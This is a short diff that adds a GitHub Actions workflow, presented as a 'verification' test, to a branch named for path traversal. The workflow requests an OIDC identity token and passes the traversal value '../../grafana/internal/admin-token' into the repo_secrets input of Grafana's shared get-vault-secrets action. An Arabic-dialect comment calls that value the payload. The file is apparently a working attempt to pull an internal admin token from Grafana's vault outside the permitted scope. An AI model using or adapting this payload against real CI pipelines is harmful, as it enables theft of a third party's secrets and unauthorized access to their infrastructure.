@@ -1,0 +1,20 @@
+name: "Verify Official Action Logic"
+on:
+  push:
+    branches: [ test-path-traversal ]
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: "Official Action Traversal Test"
+        uses: grafana/shared-workflows/actions/get-vault-secrets@main
+        with:
+          # هنا غانعطيوها الـ Payload ديريكت فـ الـ input الرسمي ديالهم
+          repo_secrets: |
+            TEST_PATH=../../grafana/internal/admin-token:value
